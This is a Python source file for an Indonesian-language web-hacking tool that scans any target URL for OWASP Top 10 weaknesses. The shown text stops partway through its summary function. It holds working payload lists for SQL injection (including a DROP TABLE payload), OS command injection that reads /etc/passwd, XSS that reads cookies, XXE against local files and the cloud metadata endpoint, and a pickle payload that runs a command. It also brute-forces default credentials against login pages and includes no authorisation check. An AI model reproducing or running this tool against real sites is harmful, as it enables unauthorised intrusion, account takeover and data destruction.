#!/usr/bin/env python3
# lang: Python3, file: mr414n_v3.py, target: Linux/Termux
# install: pip install requests colorama

import sys, time, socket, threading, subprocess
import json, datetime, re, base64
import requests
from colorama import Fore, Style, init

init(autoreset=True)
import urllib3
urllib3.disable_warnings()

RESULTS    = {}
TARGET_URL = ""

def store(method, data):
    RESULTS[method] = data

def clear():
    print("\033[2J\033[H", end="")

def rainbow(text):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN,
              Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    return "".join(colors[i % len(colors)] + c
                   for i, c in enumerate(text)) + Style.RESET_ALL

def dragon():
    lines = [
        r"    .--.    ",
        r"   |o_o |   ",
        r"   |:_/ |   ",
        r"  //   \ \  ",
        r" (|     | ) ",
        r"/'\_   _/`\ ",
        r"\___)=(___/ ",
    ]
    for line in lines:
        print(Fore.YELLOW + Style.BRIGHT + "  " + line)

BIG_TITLE = [
    " ███╗   ███╗██████╗ ██╗  ██╗ ██╗ ██╗  ██╗       ██╗██████╗  ",
    " ████╗ ████║██╔══██╗██║  ██║███║███║  ███║      ██╔╝██╔══██╗ ",
    " ██╔████╔██║██████╔╝███████║╚██║╚██║  ╚██║     ██╔╝ ██║  ██║ ",
    " ██║╚██╔╝██║██╔══██╗╚════██║ ██║ ██║   ██║    ██╔╝  ██║  ██║ ",
    " ██║ ╚═╝ ██║██║  ██║     ██║ ██║ ██║   ██║   ██╔╝   ██████╔╝ ",
    " ╚═╝     ╚═╝╚═╝  ╚═╝     ╚═╝ ╚═╝ ╚═╝   ╚═╝  ╚═╝    ╚═════╝  ",
]

def banner():
    clear()
    print()
    dragon()
    print()
    for line in BIG_TITLE:
        print(Fore.WHITE + Style.BRIGHT + "  " + line)
    print()
    print(Fore.CYAN + Style.BRIGHT +
          "  ╔════════════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT +
          "  ║" + Fore.WHITE + Style.BRIGHT +
          "         W E B   H A C K I N G              " +
          Fore.CYAN + Style.BRIGHT + "║")
    print(Fore.CYAN + Style.BRIGHT +
          "  ║" + Fore.YELLOW +
          "   [ Hunt. Probe. Crack. Own. Repeat. ]     " +
          Fore.CYAN + Style.BRIGHT + "║")
    print(Fore.CYAN + Style.BRIGHT +
          "  ║" + Fore.MAGENTA +
          "          OWASP Top 10 Coverage             " +
          Fore.CYAN + Style.BRIGHT + "║")
    print(Fore.CYAN + Style.BRIGHT +
          "  ╚════════════════════════════════════════════╝")
    print()
    print(Fore.MAGENTA + "  Author  : MR414N-ID")
    print(Fore.MAGENTA + "  Version : v3 — OWASP Full")
    print(Fore.MAGENTA + "  Mode    : Recon → Probe → Strike → Report")
    print()

def menu():
    print(Fore.GREEN + Style.BRIGHT +
          "  ┌─[ PILIH METODE ]────────────────────────────────┐")
    opts = [
        ("1",  "Header Inspector     ", "HTTP headers & security flags"),
        ("2",  "DNS Lookup           ", "Semua record DNS"),
        ("3",  "Port Scanner         ", "Port umum web server"),
        ("4",  "WHOIS Grab           ", "Info registrar & IP"),
        ("5",  "Dir Brute-Force      ", "Path & file tersembunyi"),
        ("6",  "Tech Fingerprint     ", "CMS / framework / server"),
        ("7",  "SQL Inject Probe     ", "SQLi — error & blind"),
        ("8",  "NoSQL Inject Probe   ", "MongoDB / NoSQL injection"),
        ("9",  "Command Inject Probe ", "OS command injection"),
        ("10", "XSS Probe            ", "Reflected + DOM XSS"),
        ("11", "XXE Probe            ", "XML External Entity"),
        ("12", "Broken Auth          ", "Default creds + cookie flags"),
        ("13", "Sensitive Data Scan  ", "File sensitif + HTTPS check"),
        ("14", "Broken Access Ctrl   ", "IDOR + method bypass"),
        ("15", "Security Misconfig   ", "Headers + verbose error"),
        ("16", "Insecure Deserial    ", "Serialized payload probe"),
        ("17", "Known Vuln Check     ", "Versi → CVE match"),
        ("18", "Subdomain Enum       ", "Subdomain aktif"),
        ("A",  "ALL — Full OWASP     ", "Semua metode sekaligus"),
    ]
    for code, name, desc in opts:
        print(Fore.GREEN + "  │ " +
              Fore.YELLOW + f"[{code:>2}]" +
              Fore.WHITE  + f" {name}" +
              Fore.CYAN   + f"→ {desc}")
    print(Fore.GREEN + Style.BRIGHT +
          "  └──────────────────────────────────────────────────┘")
    print()

def section(title):
    print(Fore.CYAN + Style.BRIGHT +
          f"\n  ─── {title} " + "─" * max(1, 42 - len(title)))

def hit(msg):  print(Fore.GREEN  + f"  [+] {msg}")
def miss(msg): print(Fore.RED    + f"  [-] {msg}")
def info(msg): print(Fore.YELLOW + f"  [*] {msg}")
def warn(msg): print(Fore.RED    + Style.BRIGHT + f"  [⚠] {msg}")

def get_target(method_name):
    global TARGET_URL
    section(method_name)
    url = input(Fore.WHITE + "  Masukkan URL target » ").strip()
    if not url.startswith("http"):
        url = "https://" + url
    TARGET_URL = url
    return url

def get_domain(url):
    return url.replace("https://","").replace("http://","").split("/")[0]

HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) "
                         "AppleWebKit/537.36 Chrome/120.0"}

# ══════════════════════════════════════════
#  METODE
# ══════════════════════════════════════════

def header_inspector(url):
    info("Fetching headers...")
    data = {"url": url, "headers": {}, "status": None,
            "final_url": None, "success": False}
    try:
        r = requests.get(url, timeout=10, verify=False, headers=HEADERS)
        data["headers"]   = dict(r.headers)
        data["status"]    = r.status_code
        data["final_url"] = r.url
        data["success"]   = True
        for k, v in r.headers.items():
            print(Fore.GREEN + f"  {k}: " + Fore.WHITE + v)
        print(Fore.CYAN + f"\n  Status : {r.status_code}")
        print(Fore.CYAN + f"  URL    : {r.url}")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Header Inspector", data)

def dns_lookup(url):
    domain = get_domain(url)
    info(f"DNS Lookup → {domain}")
    data = {"domain": domain, "records": {}, "success": False}
    for rt in ["A","AAAA","MX","NS","TXT","CNAME"]:
        try:
            res = subprocess.run(["dig","+short",rt,domain],
                                 capture_output=True, text=True, timeout=5)
            out = res.stdout.strip()
            if out:
                data["records"][rt] = out.splitlines()
                data["success"] = True
                hit(f"[{rt}] {out}")
        except Exception:
            data["records"][rt] = []
    store("DNS Lookup", data)

def port_scanner(url):
    domain = get_domain(url)
    info(f"Port Scan → {domain}")
    ports = [21,22,23,25,53,80,443,8080,8443,3306,5432,6379,27017]
    data  = {"domain": domain, "open": [], "closed": [], "success": False}
    lock  = threading.Lock()
    def check(p):
        try:
            s = socket.socket(); s.settimeout(1)
            s.connect((domain, p)); s.close()
            with lock:
                data["open"].append(p); data["success"] = True
                hit(f"OPEN  :{p}")
        except:
            with lock:
                data["closed"].append(p); miss(f"CLOSE :{p}")
    threads = [threading.Thread(target=check, args=(p,)) for p in ports]
    for t in threads: t.start()
    for t in threads: t.join()
    store("Port Scanner", data)

def whois_grab(url):
    domain = get_domain(url)
    info(f"WHOIS → {domain}")
    data = {"domain": domain, "info": [], "success": False}
    try:
        res = subprocess.run(["whois", domain],
                             capture_output=True, text=True, timeout=10)
        keys = ["registrar","creation","expiry","name server",
                "registrant","country","dnssec"]
        lines = [l for l in res.stdout.splitlines()
                 if any(k in l.lower() for k in keys)]
        for l in lines:
            hit(l.strip()); data["info"].append(l.strip())
        if lines:
            data["success"] = True
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("WHOIS Grab", data)

WORDLIST = [
    "admin","login","wp-admin","dashboard","config","backup",
    "test","api","upload","shell","phpinfo","robots.txt",
    ".env",".git","wp-config.php","setup","install","debug",
    "phpmyadmin","adminer","console","manager","panel",
    "xmlrpc.php","readme.html","license.txt","server-status",
]

def dir_bruteforce(url):
    info(f"Dir Brute → {url}")
    data = {"url": url, "found": [], "checked": len(WORDLIST), "success": False}
    for path in WORDLIST:
        target = f"{url.rstrip('/')}/{path}"
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code in [200,301,302,403]:
                hit(f"{r.status_code} → {target}")
                data["found"].append({"path": target, "status": r.status_code})
            else:
                miss(f"{r.status_code} → {target}")
        except:
            pass
    if data["found"]:
        data["success"] = True
    print(Fore.CYAN + f"\n  Found : {len(data['found'])} path(s)")
    store("Dir Brute-Force", data)

def tech_fingerprint(url):
    info(f"Tech Fingerprint → {url}")
    data = {"url": url, "detected": [], "server": "",
            "powered_by": "", "success": False}
    try:
        r    = requests.get(url, timeout=10, verify=False, headers=HEADERS)
        h    = r.headers
        body = r.text.lower()
        checks = {
            "WordPress"  : "wp-content" in body or "wp-includes" in body,
            "Joomla"     : "joomla" in body,
            "Drupal"     : "drupal" in body,
            "Laravel"    : "laravel" in body,
            "Django"     : "csrfmiddlewaretoken" in body,
            "React"      : "react" in body or "__react" in body,
            "PHP"        : "php" in h.get("x-powered-by","").lower(),
            "Nginx"      : "nginx" in h.get("server","").lower(),
            "Apache"     : "apache" in h.get("server","").lower(),
            "Cloudflare" : "cf-ray" in h,
            "ASP.NET"    : "asp.net" in h.get("x-powered-by","").lower(),
        }
        for tech, detected in checks.items():
            if detected:
                hit(tech); data["detected"].append(tech)
            else:
                miss(tech)
        data["server"]     = h.get("server","unknown")
        data["powered_by"] = h.get("x-powered-by","unknown")
        if data["detected"]:
            data["success"] = True
        print(Fore.CYAN + f"\n  Server       : {data['server']}")
        print(Fore.CYAN + f"  X-Powered-By : {data['powered_by']}")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Tech Fingerprint", data)

def subdomain_enum(url):
    domain = get_domain(url)
    info(f"Subdomain Enum → {domain}")
    data = {"domain": domain, "live": [], "success": False}
    lock = threading.Lock()
    subs = [
        "www","mail","ftp","admin","dev","api","test","staging",
        "portal","vpn","remote","login","cpanel","webmail",
        "shop","blog","cdn","static","assets","media","beta",
        "old","backup","secure","app","mobile","m",
    ]
    def check(sub):
        host = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(host)
            with lock:
                hit(f"{host} → {ip}")
                data["live"].append({"host": host, "ip": ip})
                data["success"] = True
        except:
            pass
    threads = [threading.Thread(target=check, args=(s,)) for s in subs]
    for t in threads: t.start()
    for t in threads: t.join()
    store("Subdomain Enum", data)

# ── OWASP probes ──────────────────────────

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--",
    '" OR ""="', "1' ORDER BY 1--",
    "1' ORDER BY 2--", "1' ORDER BY 3--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1 AND SLEEP(3)--", "1' AND SLEEP(3)--",
    "1; DROP TABLE users--",
]
SQL_ERRORS = [
    "sql","mysql","syntax","error","warning","ora-",
    "pg_query","sqlite","mssql","unclosed quotation",
    "microsoft ole db",
]

def sqli_probe(url):
    info(f"SQLi Probe → {url}")
    data = {"url": url, "vulnerable": [], "blind": [],
            "tested": len(SQLI_PAYLOADS), "success": False}
    for pl in SQLI_PAYLOADS:
        target = f"{url}?id={requests.utils.quote(pl)}"
        try:
            t0      = time.time()
            r       = requests.get(target, timeout=8, verify=False, headers=HEADERS)
            elapsed = time.time() - t0
            if any(e in r.text.lower() for e in SQL_ERRORS):
                warn(f"ERROR-BASED VULN → {pl}")
                data["vulnerable"].append(pl); data["success"] = True
            elif elapsed > 2.5 and "SLEEP" in pl.upper():
                warn(f"TIME-BASED BLIND → {pl} ({elapsed:.1f}s)")
                data["blind"].append(pl); data["success"] = True
            else:
                miss(f"clean → {pl}")
        except:
            pass
    store("SQL Inject Probe", data)

NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(1000)"}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
]

def nosql_probe(url):
    info(f"NoSQL Probe → {url}")
    data = {"url": url, "vulnerable": [],
            "tested": len(NOSQL_PAYLOADS), "success": False}
    for pl in NOSQL_PAYLOADS:
        try:
            r = requests.post(url, json=json.loads(pl),
                              timeout=6, verify=False, headers=HEADERS)
            if r.status_code in [200, 302] and len(r.text) > 100:
                warn(f"POSSIBLE NOSQL VULN → {pl}")
                data["vulnerable"].append(pl); data["success"] = True
            else:
                miss(f"clean → {pl[:40]}")
        except Exception as e:
            miss(f"error → {e}")
    store("NoSQL Inject Probe", data)

CMD_PAYLOADS = [
    "; ls", "| ls", "`ls`", "$(ls)",
    "; id", "| id", "`id`", "$(id)",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; sleep 3", "| sleep 3",
    "&& whoami", "|| whoami",
]
CMD_SIGNS = ["root:","bin:","daemon:","uid=","www-data","total ","drwx","rwxr"]

def cmdi_probe(url):
    info(f"Command Injection Probe → {url}")
    data = {"url": url, "vulnerable": [],
            "tested": len(CMD_PAYLOADS), "success": False}
    for pl in CMD_PAYLOADS:
        target = f"{url}?cmd={requests.utils.quote(pl)}"
        try:
            t0      = time.time()
            r       = requests.get(target, timeout=8, verify=False, headers=HEADERS)
            elapsed = time.time() - t0
            if any(s in r.text for s in CMD_SIGNS):
                warn(f"CMDI VULN → {pl}")
                data["vulnerable"].append(pl); data["success"] = True
            elif elapsed > 2.5 and "sleep" in pl.lower():
                warn(f"BLIND CMDI (time) → {pl} ({elapsed:.1f}s)")
                data["vulnerable"].append(pl); data["success"] = True
            else:
                miss(f"clean → {pl}")
        except:
            pass
    store("Command Inject Probe", data)

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    '"><svg/onload=alert(1)>',
    "'-alert(1)-'",
    "<script>document.write(document.cookie)</script>",
]

def xss_probe(url):
    info(f"XSS Probe → {url}")
    data = {"url": url, "reflected": [],
            "tested": len(XSS_PAYLOADS), "success": False}
    for pl in XSS_PAYLOADS:
        target = f"{url}?q={requests.utils.quote(pl)}"
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if pl.lower() in r.text.lower():
                warn(f"REFLECTED XSS → {pl[:60]}")
                data["reflected"].append(pl); data["success"] = True
            else:
                miss(f"not reflected → {pl[:50]}")
        except:
            pass
    store("XSS Probe", data)

XXE_PAYLOADS = [
    '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n<root>&xxe;</root>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<root>&xxe;</root>',
]
XXE_SIGNS = ["root:","bin:","daemon:","hostname","ami-id","instance-id"]

def xxe_probe(url):
    info(f"XXE Probe → {url}")
    data = {"url": url, "vulnerable": [],
            "tested": len(XXE_PAYLOADS), "success": False}
    xml_headers = {**HEADERS, "Content-Type": "application/xml"}
    for pl in XXE_PAYLOADS:
        try:
            r = requests.post(url, data=pl, timeout=8,
                              verify=False, headers=xml_headers)
            if any(s in r.text for s in XXE_SIGNS):
                warn("XXE VULN DETECTED")
                data["vulnerable"].append(pl[:80]); data["success"] = True
            else:
                miss("no XXE response")
        except Exception as e:
            miss(str(e))
    store("XXE Probe", data)

DEFAULT_CREDS = [
    ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin",""),
    ("root","root"), ("root","toor"), ("test","test"), ("user","user"),
    ("guest","guest"), ("administrator","administrator"),
]
LOGIN_PATHS = [
    "/login", "/admin", "/wp-login.php", "/administrator",
    "/user/login", "/auth/login", "/signin", "/panel",
]

def broken_auth(url):
    info(f"Broken Auth → {url}")
    data = {"url": url, "weak_creds": [], "cookie_issues": [],
            "login_found": [], "success": False}
    try:
        r = requests.get(url, timeout=8, verify=False, headers=HEADERS)
        for ck in r.cookies:
            issues = []
            if not ck.secure: issues.append("no Secure flag")
            if not ck.has_nonstandard_attr("HttpOnly"): issues.append("no HttpOnly flag")
            if issues:
                warn(f"Cookie '{ck.name}': {', '.join(issues)}")
                data["cookie_issues"].append({"cookie": ck.name, "issues": issues})
                data["success"] = True
            else:
                hit(f"Cookie '{ck.name}': flags OK")
    except Exception as e:
        miss(str(e))
    for path in LOGIN_PATHS:
        target = url.rstrip("/") + path
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code in [200, 302]:
                hit(f"Login page found → {target}")
                data["login_found"].append(target)
                for usr, pwd in DEFAULT_CREDS:
                    try:
                        rp = requests.post(
                            target,
                            data={"username": usr, "password": pwd,
                                  "user": usr, "pass": pwd, "email": usr},
                            timeout=5, verify=False, headers=HEADERS,
                            allow_redirects=True
                        )
                        fail_signs = ["invalid","incorrect","wrong","failed","error","login"]
                        if rp.status_code in [200,302] and not any(
                                s in rp.text.lower() for s in fail_signs):
                            warn(f"WEAK CREDS → {usr}:{pwd} @ {target}")
                            data["weak_creds"].append(
                                {"url": target, "user": usr, "pass": pwd})
                            data["success"] = True
                        else:
                            miss(f"failed → {usr}:{pwd}")
                    except:
                        pass
        except:
            pass
    store("Broken Auth", data)

SENSITIVE_PATHS = [
    ".env", ".env.backup", ".env.local", "config.php", "config.yml",
    "config.json", "database.yml", "settings.py", "wp-config.php",
    "backup.sql", "dump.sql", "db.sql", ".git/config", ".git/HEAD",
    "id_rsa", "id_dsa", "private.key", "server.key", "ssl.key", "cert.pem",
    "phpinfo.php", "info.php", "test.php", "error_log", "access.log",
    "debug.log", "composer.json", "package.json", "Dockerfile",
    "docker-compose.yml", ".htpasswd", ".bash_history",
]

def sensitive_data_scan(url):
    info(f"Sensitive Data Scan → {url}")
    data = {"url": url, "exposed": [], "https": False, "success": False}
    data["https"] = url.startswith("https://")
    if data["https"]:
        hit("HTTPS aktif")
    else:
        warn("HTTP saja — data tidak terenkripsi")
        data["success"] = True
    for path in SENSITIVE_PATHS:
        target = f"{url.rstrip('/')}/{path}"
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code == 200 and len(r.text) > 10:
                warn(f"EXPOSED → {target}")
                data["exposed"].append(
                    {"path": target, "status": r.status_code, "size": len(r.text)})
                data["success"] = True
            else:
                miss(f"{r.status_code} → {path}")
        except:
            pass
    print(Fore.CYAN + f"\n  Exposed files : {len(data['exposed'])}")
    store("Sensitive Data Scan", data)

ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/dashboard", "/manager", "/superuser", "/root",
    "/api/admin", "/api/users", "/api/config",
    "/user/1", "/user/2", "/user/admin", "/account/1", "/account/2",
]
HTTP_METHODS = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","TRACE"]

def broken_access_ctrl(url):
    info(f"Broken Access Control → {url}")
    data = {"url": url, "idor": [], "method_bypass": [],
            "open_admin": [], "success": False}
    for path in ADMIN_PATHS:
        target = url.rstrip("/") + path
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code in [200, 302]:
                warn(f"OPEN without auth → {target}")
                data["open_admin"].append({"path": target, "status": r.status_code})
                data["success"] = True
            else:
                miss(f"{r.status_code} → {path}")
        except:
            pass
    for method in HTTP_METHODS:
        try:
            r = requests.request(method, url, timeout=5,
                                 verify=False, headers=HEADERS)
            if method not in ["GET","POST"] and r.status_code < 400:
                warn(f"METHOD ALLOWED → {method} ({r.status_code})")
                data["method_bypass"].append(
                    {"method": method, "status": r.status_code})
                data["success"] = True
            else:
                miss(f"{method} → {r.status_code}")
        except:
            pass
    store("Broken Access Control", data)

SEC_HEADERS_REQUIRED = [
    "strict-transport-security", "x-content-type-options",
    "x-frame-options", "content-security-policy",
    "permissions-policy", "referrer-policy", "x-xss-protection",
]
VERBOSE_SIGNS = [
    "stack trace","traceback","exception","debug","fatal error",
    "syntax error","on line","at line","undefined variable",
    "notice:","warning:","mysql_fetch","pg_query",
]

def security_misconfig(url):
    info(f"Security Misconfig → {url}")
    data = {"url": url, "missing_headers": [], "verbose_errors": False,
            "server_info": "", "open_methods": [], "success": False}
    try:
        r = requests.get(url, timeout=10, verify=False, headers=HEADERS)
        h_lower = {k.lower(): v for k, v in r.headers.items()}
        for sh in SEC_HEADERS_REQUIRED:
            if sh not in h_lower:
                warn(f"MISSING → {sh}")
                data["missing_headers"].append(sh); data["success"] = True
            else:
                hit(f"Present → {sh}")
        srv = r.headers.get("server","")
        if srv and any(c.isdigit() for c in srv):
            warn(f"Server version exposed → {srv}"); data["success"] = True
        data["server_info"] = srv
        if any(s in r.text.lower() for s in VERBOSE_SIGNS):
            warn("Verbose error/debug info detected")
            data["verbose_errors"] = True; data["success"] = True
        else:
            hit("No verbose errors")
        ro    = requests.options(url, timeout=5, verify=False, headers=HEADERS)
        allow = ro.headers.get("Allow","")
        if allow:
            info(f"Allowed methods: {allow}")
            data["open_methods"] = allow.split(", ")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Security Misconfig", data)

DESER_PAYLOADS = {
    "PHP serialized"  : 'O:8:"stdClass":0:{}',
    "Java base64"     : base64.b64encode(b"\xac\xed\x00\x05sr\x00\x0bjava.lang.String").decode(),
    "Python pickle"   : base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
    "Ruby marshal"    : base64.b64encode(b"\x04\x08i\x00").decode(),
    "JSON type confuse": '{"__class__":"os","__reduce__":["system",["id"]]}',
}
DESER_SIGNS = [
    "unserialize","deserialization","java.io","pickle","marshal",
    "objectinputstream","classnotfoundexception","streamcorruptedexception",
    "uid=","root:","bin:",
]

def insecure_deser(url):
    info(f"Insecure Deserialization → {url}")
    data = {"url": url, "vulnerable": [],
            "tested": len(DESER_PAYLOADS), "success": False}
    for name, payload in DESER_PAYLOADS.items():
        try:
            r = requests.post(
                url, data=payload, timeout=6, verify=False,
                headers={**HEADERS, "Content-Type": "application/octet-stream"})
            if any(s in r.text.lower() for s in DESER_SIGNS):
                warn(f"DESER SIGN → {name}")
                data["vulnerable"].append(name); data["success"] = True
            else:
                miss(f"no response → {name}")
            r2 = requests.get(
                f"{url}?data={requests.utils.quote(payload)}",
                timeout=6, verify=False, headers=HEADERS)
            if any(s in r2.text.lower() for s in DESER_SIGNS):
                warn(f"DESER SIGN (GET) → {name}")
                data["vulnerable"].append(f"{name} (GET)"); data["success"] = True
        except Exception as e:
            miss(str(e))
    store("Insecure Deserialization", data)

CVE_DB = {
    "wordpress 6.0" : "CVE-2022-3590 — reflected XSS",
    "wordpress 5.8" : "CVE-2021-39200 — info disclosure",
    "wordpress 5.6" : "CVE-2021-29447 — XXE via media upload",
    "joomla 3.9"    : "CVE-2019-10945 — path traversal",
    "joomla 4.0"    : "CVE-2023-23752 — improper access check",
    "drupal 9"      : "CVE-2022-25271 — remote code execution",
    "apache 2.4.49" : "CVE-2021-41773 — path traversal RCE",
    "apache 2.4.50" : "CVE-2021-42013 — path traversal bypass",
    "nginx 1.18"    : "CVE-2021-23017 — off-by-one in resolver",
    "php 8.0"       : "CVE-2022-31628 — stack overflow",
    "php 7.4"       : "CVE-2020-7071 — URL parsing bypass",
    "laravel 8"     : "CVE-2021-3129 — RCE via debug mode",
    "django 3.2"    : "CVE-2022-28347 — SQL injection",
}

def known_vuln_check(url):
    info(f"Known Vuln Check → {url}")
    data = {"url": url, "matches": [], "versions_found": [], "success": False}
    try:
        r    = requests.get(url, timeout=10, verify=False, headers=HEADERS)
        body = r.text.lower()
        version_hints = []
        srv = r.headers.get("server","").lower()
        px  = r.headers.get("x-powered-by","").lower()
        if srv: version_hints.append(srv)
        if px:  version_hints.append(px)
        gen = re.findall(r'generator["\s]+content=["\s]+([^"]+)', body)
        version_hints.extend(gen)
        info(f"Version hints: {version_hints}")
        data["versions_found"] = version_hints
        for hint in version_hints:
            for key, cve in CVE_DB.items():
                if all(part in hint for part in key.split()):
                    warn(f"MATCH → {key} : {cve}")
                    data["matches"].append({"version": key, "cve": cve})
                    data["success"] = True
        if not data["matches"]:
            hit("No matches in local CVE DB")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Known Vuln Check", data)

# ══════════════════════════════════════════
#  FULL RECON
# ══════════════════════════════════════════

ALL_STEPS = [
    ("Header Inspector",        header_inspector),
    ("DNS Lookup",              dns_lookup),
    ("Port Scanner",            port_scanner),
    ("WHOIS Grab",              whois_grab),
    ("Dir Brute-Force",         dir_bruteforce),
    ("Tech Fingerprint",        tech_fingerprint),
    ("SQL Inject Probe",        sqli_probe),
    ("NoSQL Inject Probe",      nosql_probe),
    ("Command Inject Probe",    cmdi_probe),
    ("XSS Probe",               xss_probe),
    ("XXE Probe",               xxe_probe),
    ("Broken Auth",             broken_auth),
    ("Sensitive Data Scan",     sensitive_data_scan),
    ("Broken Access Control",   broken_access_ctrl),
    ("Security Misconfig",      security_misconfig),
    ("Insecure Deserialization",insecure_deser),
    ("Known Vuln Check",        known_vuln_check),
    ("Subdomain Enum",          subdomain_enum),
]

def full_recon(url):
    print(Fore.MAGENTA + Style.BRIGHT +
          "\n  ══════ FULL OWASP RECON ACTIVATED ══════\n")
    for name, fn in ALL_STEPS:
        section(name)
        fn(url)
        time.sleep(0.2)
    print(Fore.MAGENTA + Style.BRIGHT +
          "\n  ══════ FULL RECON COMPLETE ══════\n")

# ══════════════════════════════════════════
#  SUMMARY — berhasil / gagal / vuln list
# ══════════════════════════════════════════

def print_summary():
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print()
    print(Fore.CYAN + Style.BRIGHT +
          "  ╔══════════════════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT +
          "  ║" + Fore.WHITE + Style.BRIGHT +
          "           HASIL SCAN — OWASP SUMMARY             " +
          Fore.CYAN + Style.BRIGHT + "║")
    print(Fore.CYAN + Style.BRIGHT +
          "  ╚══════════════════════════════════════════════════╝")
    print(Fore.YELLOW + f"  Target  : {TARGET_URL}")
    print(Fore.YELLOW + f"  Waktu   : {ts}")
    print(Fore.YELLOW + f"  Metode  : {len(RESULTS)} dijalankan")
    print()

    VULN_FOUND   = []
    SUCCESS_LIST = []
    FAIL_LIST    = []

    for method, data in RESULTS.items():
        print(Fore.CYAN + Style.BRIGHT + f"  ┌─[ {method} ]")

        if method == "Header Inspector":
            s = data.get("status","?")
            print((Fore.GREEN if s == 200 else Fore.YELLOW) +
                  f"  │  Status      : {s}")
            print(Fore.WHITE + f"  │  Final URL   : {data.get('final_url','?')}")

        elif method == "DNS Lookup":
            for rt, vals in data.get("records",{}).items():
                if vals:
                    print(Fore.GREEN + f"  │  [{rt}] {', '.join(vals[:2])}")

        elif method == "Port Scanner":
            opens = data.get("open",[])
            print((Fore.GREEN if opens else Fore.RED) +
                  f"  │  Open ports  : {opens if opens else 'none'}")

        elif method == "WHOIS Grab":
            for l in data.get("info",[])[:3]:
                print(Fore.WHITE + f"  │  {l}")

        elif method == "Dir Brute-Force":
            found = data.get("found",[])
            print((Fore.GREEN if found else Fore.WHITE) +
                  f"  │  Found paths : {len(found)}")
            for f in found[:4]:
                print(Fore.GREEN + f"  │    [{f['status']}] {f['path']}")

        elif method == "Tech Fingerprint":
            detected = data.get("detected",[])
            print(Fore.GREEN + "  │  Detected    : " +
                  (", ".join(detected) if detected else "none"))

        elif method == "SQL Inject Probe":
            vuln  = data.get("vulnerable",[])
            blind = data.get("blind",[])
            if vuln:
                warn(f"SQLi ERROR-BASED : {len(vuln)} payload")
                VULN_FOUND.append(f"SQLi Error-Based ({len(vuln)} payload)")
                for pl in vuln: print(Fore.RED + f"  │    → {pl}")
            if blind:
                warn(f"SQLi TIME-BASED  : {len(blind)} payload")
                VULN_FOUND.append(f"SQLi Time-Based Blind ({len(blind)} payload)")
            if not vuln and not blind:
                print(Fore.GREEN + "  │  SQLi : clean")

        elif method == "NoSQL Inject Probe":
            vuln = data.get("vulnerable",[])
            if vuln:
                warn(f"NoSQL VULN : {len(vuln)} payload")
                VULN_FOUND.append(f"NoSQL Injection ({len(vuln)} payload)")
            else:
                print(Fore.GREEN + "  │  NoSQLi : clean")

        elif method == "Command Inject Probe":
            vuln = data.get("vulnerable",[])
            if vuln:
                warn(f"CMDI VULN : {len(vuln)} payload")
                VULN_FOUND.append(f"Command Injection ({len(vuln)} payload)")
            else:
                print(Fore.GREEN + "  │  CMDi : clean")

        elif method == "XSS Probe":
            ref = data.get("reflected",[])
            if ref:
                warn(f"XSS REFLECTED : {len(ref)} payload")
                VULN_FOUND.append(f"Reflected XSS ({len(ref)} payload)")
                for pl in ref[:2]: print(Fore.RED + f"  │    → {pl[:60]}")
            else:
                print(Fore.GREEN + "  │  XSS : clean")

        elif method == "XXE Probe":
            vuln = data.get("vulnerable",[])
            if vuln:
                warn("XXE VULN DETECTED")
                VULN_FOUND.append("XXE Injection")
            else:
                print(Fore.GREEN + "  │  XXE : clean")

        elif method == "Broken Auth":
            weak = data.get("weak_creds",[])
            ck   = data.get("cookie_issues",[])
            if weak:
                warn(f"WEAK CREDS : {len(weak)} found")
                VULN_FOUND.append(f"Broken Auth — weak creds ({len(weak)})")
                for w in weak:
                    print(Fore.RED + f"  │    {w['user']}:{w['pass']} @ {w['url']}")
            if ck:
                warn(f"Cookie issues : {len(ck)}")
                VULN_FOUND.append(f"Broken Auth — cookie flags ({len(ck)})")
            if not weak and not ck:
                print(Fore.GREEN + "  │  Auth : clean")

        elif method == "Sensitive Data Scan":
            exposed = data.get("exposed",[])
            if exposed:
                warn(f"EXPOSED FILES : {len(exposed)}")
                VULN_FOUND.append(f"Sensitive Data Exposed ({len(exposed)} file)")
                for e in exposed[:4]:
                    print(Fore.RED + f"  │    {e['path']} ({e['size']} bytes)")
            else:
                print(Fore.GREEN + "  │  Sensitive data : none exposed")
            if not data.get("https"):
                VULN_FOUND.append("No HTTPS — data dikirim tanpa enkripsi")
            print(Fore.WHITE + f"  │  HTTPS : {'✓' if data.get('https') else '✗'}")

